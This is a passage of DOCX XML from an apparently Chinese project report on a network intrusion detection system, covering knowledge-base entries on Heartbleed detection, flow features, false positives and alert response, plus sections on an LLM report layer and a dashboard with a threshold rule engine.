              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>heartbleed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="039D0EAF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Heartbleed（CVE-2014-0160）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3E13897B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>heartbleed、openssl、tls、心跳、信息泄露</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2AC31EE8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Heartbleed 是 OpenSSL 心跳扩展（Heartbeat Extension）实现中的越界读取漏洞。客户端声明心跳载荷长度为 N，但实际只发送很少的字节；有漏洞的服务端不做长度校验，直接把内存中 N 字节的数据回传，其中可能包含私钥、会话标识、口令等敏感信息。流量特征是极短的 TLS 连接、请求侧载荷很小而响应侧明显超出请求长度、往往伴随异常大的 Fwd/Bwd 包长比。修补方式是升级 OpenSSL，并在泄露后吊销并更换证书与密钥。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="02839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5C9508D8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>flow-features</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4982E58D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>流特征的含义（CICFlowMeter 口径）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="06B5122D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>特征、flow、iat、iat、统计</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="31361F1E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>本系统用 78 维流级统计特征。核心几类：一是规模类（前向/后向包数与字节数），反映会话大小；二是时序类（Flow IAT、Fwd/Bwd IAT 的均值方差最大最小值），攻击工具产生的包间隔往往过于均匀或过于密集；三是包长分布（最大最小均值标准差），正常业务混合大小包，扫描类则高度单一；四是标志位计数（SYN、ACK、RST、PSH 等），直接对应 TCP 状态机行为；五是速率类（Flow Bytes/s、Flow Packets/s）。Active/Idle 统计把流按 5 秒间隔切成活跃期与空闲期，用来刻画长连接的节奏。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="09F33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535CB81A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>iat-semantics</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6C19BEE9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>IAT 与速率特征的解读边界</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="765930A7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>iat、时间间隔、速率、误读</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="28A39F00">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>IAT（Inter-Arrival Time）是相邻包的时间间隔。它非常依赖抓包位置：在探针主机上抓到的 IAT 包含了本机的协议栈排队与调度延迟，与交换机镜像口抓到的不同。速率类特征（Flow Bytes/s）在流时长极短时会被放大到失真，因此分析时必须同时看包的绝对数量，不能只看速率。同理，被截断的长连接其 Flow Duration 只是真实时长的一部分，速率会被系统性高估。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="2ABED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34BD06A0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>false-positive</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="27BF9917">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>误报的常见来源</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1D9AC22D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>误报、监控、扫描、基线</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="56065B72">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>入侵检测的主要成本往往不是漏报而是误报。常见来源：资产盘点与漏洞扫描器（行为与端口扫描几乎一致）、备份与同步任务（产生大流量且周期性）、健康检查与压测（高并发短连接）、NAT 网关后的多用户共享同一出口 IP（看起来像单源高频访问）。处置建议里应包含「先在资产清单里确认该源 IP 的归属与用途」，而不是直接封禁。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="10790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247" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="65BB4430">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>response-playbook</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="11D631F9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>告警响应的分层处置顺序</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="36D331DE">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>处置、响应、封禁、取证</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="60888783">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>合理的处置顺序是：先保全证据（保存 pcap 与流特征 CSV，记录时间窗），再判定影响面（该源 IP 是否命中资产清单、目标端口承载什么业务），然后做最小干预（在边界 ACL 或 WAF 上临时封禁该源，而不是关停服务），最后复盘并补规则。直接封禁整个网段或关停服务属于过度反应，会造成比攻击本身更大的业务损失。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="66DB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139E8ABF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>sampling-bias</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1EC53D50">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>数据集类别先验与线上指标的差别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6057590F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>数据集、先验、指标、评测</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3384DE91">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>公开数据集里正常流量占比通常在八成以上，但为了让模型能学到稀有攻击，训练样本往往按类配额抽样，导致类别先验被人为抬高。在这样的样本上算出的准确率不能直接当作线上准确率：线上正常流量占绝大多数，同样的误报率意味着完全不同的误报数量。评测里更可靠的做法是看每类召回、看跨时间段留出，并把先验差异写进结论。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="72605098">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B821AE4">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.4.7 小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA8546F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本部分交付了从“告警”到“报告”的完整路径，并且把这条路径上的每一步都做成了可检查的：提示词里的三条铁律对应三个具体的失败模式，schema 校验对应“字段缺失即拒绝”，降级路径对应“大模型挂了服务不能挂”。实测单份报告中位耗时 4.97 秒、中位正文 1 122 字，报告里引用的证据都能回溯到特征值和规则命中记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B07E899">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这一层能做的事情有明确边界：它不判断、不预测、不替代分类器。把边界写清楚，比让它“看起来更智能”更有价值——否则一旦它改判，整个系统的评测口径就散了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F6D08F">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.5 王储：可视化看板与阈值规则引擎（M5 / M11）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20225A5E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本人负责“让人看见结果”和“让系统有确定性下限”两件事：四个标签页的看板、以及与小模型并跑的阈值规则引擎。另外负责全部单元测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FDAD56">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-10　本部分涉及的源文件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1134"/>
        <w:gridCol w:w="4649"/>
      </w:tblGrid>
      <w:tr w14:paraId="27F5E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EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="68279439">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2736F50C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>行数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4649" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="71EF7E9B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>职责</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="40DF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019DA9C6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>dashboard/app.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5F044A09">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>445</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4649" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2BEBF9DC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>四个标签页、图表、局部自动刷新</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="209B8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10858D2F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>center/rules.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="32E439B6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>292</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4649" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2086A322">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>单流规则 + 窗口规则 + 按域去重</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3727E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35" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6ACF2DE6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>tools/rules_baseline.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="24D4FFA2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>109</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4649" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3AC2AACD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>规则基线在与模型相同的测试集上评测</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0167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5C23B47F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>tests/*.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0CA8C50A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>649</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4649" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3549E19F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
